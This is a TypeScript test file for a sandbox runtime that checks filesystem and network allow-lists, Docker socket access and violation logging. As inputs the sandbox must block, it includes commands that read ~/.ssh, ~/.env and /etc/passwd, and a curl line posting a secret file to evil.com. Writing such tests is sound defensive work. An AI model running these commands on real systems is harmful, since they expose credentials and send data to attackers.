/**
 * Integration Tests for Sandbox Runtime
 *
 * These tests verify that the sandbox-runtime integration provides
 * the intended security guarantees while maintaining developer productivity.
 *
 * Test coverage:
 * - Filesystem access (read/write within allowed directories)
 * - Filesystem restrictions (blocking access outside allowed directories)
 * - Network access (allowed domains)
 * - Network restrictions (blocking non-allowed domains)
 * - Docker support via Unix socket access
 * - Custom domain configuration
 * - Violation monitoring (macOS)
 * - Platform detection
 *
 * Implementation based on spec: s-5eqd (Sandbox Verification Test Plan)
 */

import { describe, test, expect, beforeEach, afterEach } from 'vitest';
import fs from 'fs';
import os from 'os';
import path from 'path';
import {
  execSandboxed,
  getDefaultAllowedDomains,
  shouldSkipSandboxTest,
  type SandboxConfig,
} from './sandbox-helpers.js';

/**
 * Test 1: CWD File Access (Read/Write)
 *
 * Verify that sandboxed commands can read and write files
 * within the allowed directory.
 */
describe('Sandbox - Filesystem Access', () => {
  let testDir: string;

  beforeEach(() => {
    testDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sandbox-test-'));
    fs.writeFileSync(path.join(testDir, 'test.txt'), 'test content');
  });

  afterEach(() => {
    if (fs.existsSync(testDir)) {
      fs.rmSync(testDir, { recursive: true, force: true });
    }
  });

  test('should allow reading files in allowed directory', async () => {
    if (await shouldSkipSandboxTest()) return;

    const result = await execSandboxed(`cat ${testDir}/test.txt`, {
      allowRead: [testDir],
      allowWrite: [testDir],
    });

    expect(result.exitCode).toBe(0);
    expect(result.stdout.trim()).toBe('test content');
  });

  test('should allow writing files in allowed directory', async () => {
    if (await shouldSkipSandboxTest()) return;

    const result = await execSandboxed(`echo "hello" > ${testDir}/output.txt`, {
      allowRead: [testDir],
      allowWrite: [testDir],
    });

    expect(result.exitCode).toBe(0);
    const content = fs.readFileSync(path.join(testDir, 'output.txt'), 'utf-8');
    expect(content.trim()).toBe('hello');
  });

  test('should allow operations in subdirectories', async () => {
    if (await shouldSkipSandboxTest()) return;

    fs.mkdirSync(path.join(testDir, 'subdir'));

    const result = await execSandboxed(`echo "data" > ${testDir}/subdir/file.txt`, {
      allowRead: [testDir],
      allowWrite: [testDir],
    });

    expect(result.exitCode).toBe(0);
    const content = fs.readFileSync(path.join(testDir, 'subdir', 'file.txt'), 'utf-8');
    expect(content.trim()).toBe('data');
  });
});

/**
 * Test 2: Cannot Access Files Outside Allowed Directory
 *
 * Verify that sandbox-runtime prevents access outside allowed paths.
 */
describe('Sandbox - Filesystem Restrictions', () => {
  let testDir: string;
  let outsideFile: string;

  beforeEach(() => {
    testDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sandbox-test-'));
    outsideFile = path.join(os.tmpdir(), 'outside-sandbox.txt');
    fs.writeFileSync(outsideFile, 'secret');
  });

  afterEach(() => {
    if (fs.existsSync(testDir)) {
      fs.rmSync(testDir, { recursive: true, force: true });
    }
    if (fs.existsSync(outsideFile)) {
      fs.unlinkSync(outsideFile);
    }
  });

  test('should block reading files outside allowed directory', async () => {
    if (await shouldSkipSandboxTest()) return;

    const result = await execSandboxed(`cat ${outsideFile}`, {
      allowRead: [testDir],
      allowWrite: [testDir],
    });

    expect(result.exitCode).not.toBe(0);
    // Check for common permission denied messages
    const errorIndicators = ['permission denied', 'Operation not permitted', 'denied', 'not permitted'];
    const hasError = errorIndicators.some(indicator =>
      result.stderr.toLowerCase().includes(indicator.toLowerCase())
    );
    expect(hasError).toBe(true);
  });

  test('should block reading /etc/hosts', async () => {
    if (await shouldSkipSandboxTest()) return;

    const result = await execSandboxed('cat /etc/hosts', {
      allowRead: [testDir],
      allowWrite: [testDir],
    });

    expect(result.exitCode).not.toBe(0);
  });

  test('should block reading home directory', async () => {
    if (await shouldSkipSandboxTest()) return;

    const result = await execSandboxed('cat ~/.bashrc', {
      allowRead: [testDir],
      allowWrite: [testDir],
    });

    expect(result.exitCode).not.toBe(0);
  });

  test('should block writing outside allowed directory', async () => {
    if (await shouldSkipSandboxTest()) return;

    const targetFile = path.join(os.tmpdir(), 'leak.txt');

    // Make sure it doesn't exist before the test
    if (fs.existsSync(targetFile)) {
      fs.unlinkSync(targetFile);
    }

    const result = await execSandboxed(`echo "leaked" > ${targetFile}`, {
      allowRead: [testDir],
      allowWrite: [testDir],
    });

    expect(result.exitCode).not.toBe(0);
    expect(fs.existsSync(targetFile)).toBe(false);
  });

  test('should block accessing sensitive directories', async () => {
    if (await shouldSkipSandboxTest()) return;

    const sensitiveTests = ['ls ~/.ssh', 'cat ~/.env', 'cat /etc/passwd'];

    for (const cmd of sensitiveTests) {
      const result = await execSandboxed(cmd, {
        allowRead: [testDir],
        allowWrite: [testDir],
      });
      expect(result.exitCode).not.toBe(0);
    }
  });
});

/**
 * Test 3: Network - Allowed Domains Work
 *
 * Verify that sandboxed commands can access allowed domains.
 */
describe('Sandbox - Network Access', () => {
  test('should allow curl to allowed domain (github.com)', async () => {
    if (await shouldSkipSandboxTest()) return;

    const result = await execSandboxed('curl -s https://api.github.com/zen', {
      allowedDomains: ['api.github.com'],
    });

    expect(result.exitCode).toBe(0);
    expect(result.stdout.length).toBeGreaterThan(0);
  });

  test('should allow curl to multiple allowed domains', async () => {
    if (await shouldSkipSandboxTest()) return;

    const testCases = [
      { url: 'https://registry.npmjs.org/react', domain: 'registry.npmjs.org' },
      { url: 'https://pypi.org/pypi/requests/json', domain: 'pypi.org' },
    ];

    for (const { url, domain } of testCases) {
      const result = await execSandboxed(`curl -s ${url}`, {
        allowedDomains: [domain],
      });

      expect(result.exitCode).toBe(0);
      expect(result.stdout.length).toBeGreaterThan(0);
    }
  });

  test.skip('should allow package manager operations', async () => {
    if (await shouldSkipSandboxTest()) return;

    const testDir = fs.mkdtempSync(path.join(os.tmpdir(), 'npm-test-'));

    try {
      fs.writeFileSync(
        path.join(testDir, 'package.json'),
        JSON.stringify({
          name: 'test',
          dependencies: { lodash: '^4.17.21' },
        })
      );

      const result = await execSandboxed(`cd ${testDir} && npm install`, {
        allowRead: [testDir],
        allowWrite: [testDir],
        allowedDomains: ['registry.npmjs.org'],
      });

      expect(result.exitCode).toBe(0);
      expect(fs.existsSync(path.join(testDir, 'node_modules'))).toBe(true);
    } finally {
      fs.rmSync(testDir, { recursive: true, force: true });
    }
  });
});

/**
 * Test 4: Network - Non-Allowed Domains Blocked
 *
 * Verify that sandboxed commands cannot access non-allowed domains.
 */
describe('Sandbox - Network Restrictions', () => {
  test('should block curl to non-allowed domain', async () => {
    if (await shouldSkipSandboxTest()) return;

    const result = await execSandboxed('curl -s https://example.com', {
      allowedDomains: ['github.com'], // example.com not in list
    });

    expect(result.exitCode).not.toBe(0);
  });

  test('should block multiple non-allowed domains', async () => {
    if (await shouldSkipSandboxTest()) return;

    const blockedDomains = [
      'https://random-site.com',
      'https://suspicious-domain.xyz',
      'https://untrusted-api.io',
    ];

    for (const url of blockedDomains) {
      const result = await execSandboxed(`curl -s ${url}`, {
        allowedDomains: ['github.com'],
      });

      expect(result.exitCode).not.toBe(0);
    }
  });

  test('should block data exfiltration attempts', async () => {
    if (await shouldSkipSandboxTest()) return;

    const testDir = fs.mkdtempSync(path.join(os.tmpdir(), 'exfil-test-'));

    try {
      fs.writeFileSync(path.join(testDir, 'secret.txt'), 'sensitive data');

      // Attempt to exfiltrate data to non-allowed domain
      const result = await execSandboxed(
        `curl -X POST -d @${testDir}/secret.txt https://evil.com/collect`,
        {
          allowRead: [testDir],
          allowedDomains: ['github.com'],
        }
      );

      expect(result.exitCode).not.toBe(0);
    } finally {
      fs.rmSync(testDir, { recursive: true, force: true });
    }
  });
});

/**
 * Test 5: Docker Unix Socket Access
 *
 * Verify that Docker works via Unix socket access.
 */
describe('Sandbox - Docker Support', () => {
  test('should allow docker ps with unix socket access', async () => {
    if (await shouldSkipSandboxTest()) return;

    const result = await execSandboxed('docker ps', {
      allowUnixSockets: ['/var/run/docker.sock'],
    });

    // Skip test if Docker not running
    if (result.stderr.includes('Cannot connect to the Docker daemon')) {
      console.log('⚠️  Skipping: Docker not running');
      return;
    }

    expect(result.exitCode).toBe(0);
  });

  test.skip('should allow docker commands with filesystem restrictions', async () => {
    if (await shouldSkipSandboxTest()) return;

    const testDir = fs.mkdtempSync(path.join(os.tmpdir(), 'docker-test-'));

    try {
      fs.writeFileSync(path.join(testDir, 'Dockerfile'), 'FROM alpine\nRUN echo "test"');

      const result = await execSandboxed(`cd ${testDir} && docker build -t test-image .`, {
        allowRead: [testDir],
        allowWrite: [testDir],
        allowUnixSockets: ['/var/run/docker.sock'],
      });

      if (result.stderr.includes('Cannot connect to the Docker daemon')) {
        console.log('⚠️  Skipping: Docker not running');
        return;
      }

      expect(result.exitCode).toBe(0);
    } finally {
      fs.rmSync(testDir, { recursive: true, force: true });
    }
  });
});

/**
 * Test 6: User Custom Allowed Domains
 *
 * Verify that custom domains can be merged with defaults.
 */
describe('Sandbox - Configuration Merging', () => {
  test('should merge user domains with defaults', () => {
    const defaultDomains = getDefaultAllowedDomains();
    const userDomains = ['api.example.com', 'internal.company.com'];

    const merged = [...defaultDomains, ...userDomains];

    expect(merged).toContain('github.com'); // default
    expect(merged).toContain('api.example.com'); // user
    expect(merged).toContain('internal.company.com'); // user
  });

  test('should include all expected default domains', () => {
    const defaults = getDefaultAllowedDomains();

    // Check for critical default domains
    expect(defaults).toContain('api.anthropic.com');
    expect(defaults).toContain('github.com');
    expect(defaults).toContain('registry.npmjs.org');
    expect(defaults).toContain('pypi.org');
  });
});

/**
 * Test 7: Violation Monitoring (macOS only)
 *
 * Verify that sandbox violations are captured and logged.
 */
describe('Sandbox - Violation Monitoring', () => {
  beforeEach(() => {
    if (process.platform !== 'darwin') {
      console.log('⚠️  Skipping: Violation monitoring only available on macOS');
    }
  });

  test('should log filesystem violations', async () => {
    if (process.platform !== 'darwin' || (await shouldSkipSandboxTest())) return;

    const testDir = fs.mkdtempSync(path.join(os.tmpdir(), 'violation-test-'));
    const violationLog = path.join(testDir, 'violations.log');

    try {
      await execSandboxed('cat /etc/hosts', {
        allowRead: [testDir],
        violationLog,
      });

      expect(fs.existsSync(violationLog)).toBe(true);

      const violations = fs.readFileSync(violationLog, 'utf-8');
      expect(violations).toContain('/etc/hosts');
    } finally {
      fs.rmSync(testDir, { recursive: true, force: true });
    }
  });

  test('should log network violations', async () => {
    if (process.platform !== 'darwin' || (await shouldSkipSandboxTest())) return;

    const testDir = fs.mkdtempSync(path.join(os.tmpdir(), 'violation-test-'));
    const violationLog = path.join(testDir, 'violations.log');

    try {
      await execSandboxed('curl https://blocked-domain.com', {
        allowedDomains: ['github.com'],
        violationLog,
      });

      expect(fs.existsSync(violationLog)).toBe(true);

      const violations = fs.readFileSync(violationLog, 'utf-8');
      expect(violations).toContain('blocked-domain.com');
    } finally {
      fs.rmSync(testDir, { recursive: true, force: true });
    }
  });
});

/**
 * Test 8: Platform Detection
 *
 * Verify correct behavior per platform.
 */
describe('Sandbox - Platform Support', () => {
  test('should detect macOS or Linux platform', () => {
    const supportedPlatforms = ['darwin', 'linux', 'win32'];
    expect(supportedPlatforms).toContain(process.platform);
  });

  test('should skip sandbox on Windows', async () => {
    if (process.platform !== 'win32') {
      console.log('⚠️  Skipping: Only applicable on Windows');
      return;
    }

    // On Windows, srt should not be available
    const result = await execSandboxed('echo test', {});
    // Either srt is not found (127) or it's a fallback
    expect([0, 127]).toContain(result.exitCode);
  });

  test('sandbox helpers should work on supported platforms', async () => {
    const defaults = getDefaultAllowedDomains();
    expect(defaults.length).toBeGreaterThan(0);
    expect(defaults).toContain('github.com');
  });
});
